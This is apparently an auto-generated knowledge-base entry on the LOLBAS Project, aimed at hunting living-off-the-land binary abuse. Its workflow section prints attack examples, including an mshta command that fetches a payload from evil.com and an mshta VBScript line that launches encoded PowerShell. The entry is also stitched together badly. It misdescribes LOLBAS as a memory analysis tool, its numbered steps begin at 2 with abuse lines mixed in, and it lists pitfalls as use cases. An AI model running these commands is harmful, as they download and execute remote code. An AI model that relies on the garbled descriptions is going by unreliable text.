# Lolbas Project

## Overview
Lolbas Project is a memory analysis tool that appears across threat hunting workflows in this knowledge base. It is referenced as part of higher-level security analysis, investigation, monitoring, or validation activity rather than as an end in itself.

## What It Is
Lolbas Project is best understood as a threat-hunting tool in this knowledge base. Its role is conceptual and system-facing rather than procedural: it gives analysts or defenders a structured way to examine evidence, model system behavior, or reason about security state.

## How It Works
Lolbas Project works by turning technical inputs into more interpretable outputs at the system level. Across the source skills, it appears as part of larger analysis, investigation, monitoring, or validation loops rather than as a standalone end state.

## Core Concepts
- malware
- fileless
- LOLBins
- memory analysis
- detection
- malware analysis
- threat hunting
- mitre attack
- edr
- siem
- proactive detection
- defense evasion

## Typical Workflow
- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Abuse: Execute HTA files with embedded VBScript/JScript
- Example: mshta http://evil.com/payload.hta
- Example: mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ...""")
- Abuse: Load scriptlets via COM (.sct files) - "Squiblydoo"
- 2. **Identify Target LOLBins**: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).
- 3. **Collect Process Telemetry**: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.
- 4. **Baseline Normal Behavior**: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.
- 5. **Identify Anomalies**: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.
- 6. **Correlate and Enrich**: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.

## Use Cases
- EDR alerts indicate suspicious behavior from trusted system binaries (PowerShell, mshta, wmic, regsvr32)
- Investigating attacks that leave no traditional malware files on disk
- Analyzing WMI event subscriptions, registry-stored payloads, or scheduled task abuse for persistence
- Building detection rules for LOLBin (Living Off the Land Binary) abuse in enterprise environments
- Memory forensics reveals malicious code but no corresponding files exist on the filesystem
- Rebooting the system before capturing a memory dump (destroys in-memory evidence)
- Focusing only on file-based IOCs when the attack is entirely fileless
- When investigating fileless malware campaigns that bypass traditional AV
- During proactive threat hunts targeting defense evasion techniques
- When EDR alerts fire on legitimate binaries executing unusual child processes

## Limitations
- Output still depends on context, data quality, and surrounding analysis.
- The tool should be interpreted as part of a broader workflow, not as a complete answer by itself.
- Capabilities and visibility vary depending on environment, integrations, and available inputs.

## Related Tools
- Sysmon, CrowdStrike Falcon, Elastic Security, Microsoft Defender For Endpoint, Sigma Rules, Splunk, And Fileless Malware Artifacts, And Network Connections

## Sources
- detecting-fileless-malware-techniques
- hunting-for-living-off-the-land-binaries
- hunting-for-lolbins-execution-in-endpoint-logs
